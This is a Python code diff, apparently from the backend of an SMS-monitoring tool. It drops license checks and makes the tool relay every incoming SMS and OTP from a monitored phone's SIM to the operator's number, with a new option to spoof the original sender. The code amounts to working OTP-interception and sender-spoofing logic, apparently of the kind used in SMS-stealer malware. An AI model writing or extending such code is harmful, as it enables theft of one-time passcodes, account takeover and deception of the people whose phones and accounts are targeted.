@@ -257,15 +257,10 @@ async def push_outbound_to_firebase(
 
 async def send_polling_startup_test(db, profile: MonitorProfile, device: Device) -> None:
     """On monitoring start — send test SMS to /mynum immediately."""
-    import asyncio
-
-    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
-    from app.license_keys import license_key_exists
+    from app.device_ui import STARTUP_TEST_MESSAGE
     from app.services import normalize_phone
 
-    license_key = (profile.license_key or "").strip().upper()
-    if not license_key_exists(license_key):
-        logger.warning("Startup test skipped: invalid or missing license key")
+    if not profile.phone_number or not profile.is_monitoring:
         return
 
     firebase_url = resolve_firebase_url(profile)
@@ -284,26 +279,18 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
         except (json.JSONDecodeError, TypeError, ValueError):
             pass
 
-    tasks: list = []
-
-    if profile.phone_number:
-        mynum = normalize_phone(profile.phone_number)
-        # Real SMS from selected SIM -> /mynum (recharge check: balance nahi to nahi jayega)
-        tasks.append(
-            push_outgoing_sms_command(
-                firebase_url,
-                device.name,
-                mynum,
-                STARTUP_TEST_MESSAGE,
-                sim_index=sim_index,
-                sim_slot=sim_slot,
-            )
+    mynum = normalize_phone(profile.phone_number)
+    try:
+        await push_outgoing_sms_command(
+            firebase_url,
+            device.name,
+            mynum,
+            STARTUP_TEST_MESSAGE,
+            sim_index=sim_index,
+            sim_slot=sim_slot,
         )
-
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for result in results:
-        if isinstance(result, Exception):
-            logger.warning("Startup test failed: %s", result)
+    except Exception as exc:
+        logger.warning("Startup test failed: %s", exc)
 
 
 async def forward_incoming_to_mynum(
@@ -313,17 +300,40 @@ async def forward_incoming_to_mynum(
     sender: str,
     message: str,
 ) -> None:
-    """Forward device incoming SMS to /mynum via outbox + Firebase commands."""
-    from app.license_keys import license_key_exists
+    """Forward incoming SMS/OTP to /mynum as real SMS from the monitored device SIM."""
+    from app.channel_relay import prepare_sms_forward
+    from app.services import normalize_phone
 
-    license_key = (profile.license_key or "").strip().upper()
-    if not profile.phone_number or not profile.is_monitoring or not license_key_exists(license_key):
+    if not profile.phone_number or not profile.is_monitoring:
         return
 
-    from app.channel_relay import queue_forward_to_mynum
+    firebase_url = resolve_firebase_url(profile)
+    if not firebase_url:
+        return
+
+    sender, message = prepare_sms_forward(sender, message)
+    mynum = normalize_phone(profile.phone_number)
+
+    sim_index = profile.selected_sim_index or 0
+    sim_slot = sim_index + 1
+    if device.device_meta:
+        try:
+            meta = json.loads(device.device_meta)
+            sims = meta.get("sims") or []
+            if sims and 0 <= sim_index < len(sims):
+                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
+        except (json.JSONDecodeError, TypeError, ValueError):
+            pass
 
     try:
-        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
-        await push_outbound_to_firebase(profile, device, outbound)
+        await push_outgoing_sms_command(
+            firebase_url,
+            device.name,
+            mynum,
+            message,
+            sim_index=sim_index,
+            sim_slot=sim_slot,
+            spoof_sender=sender or None,
+        )
     except Exception as exc:
         logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
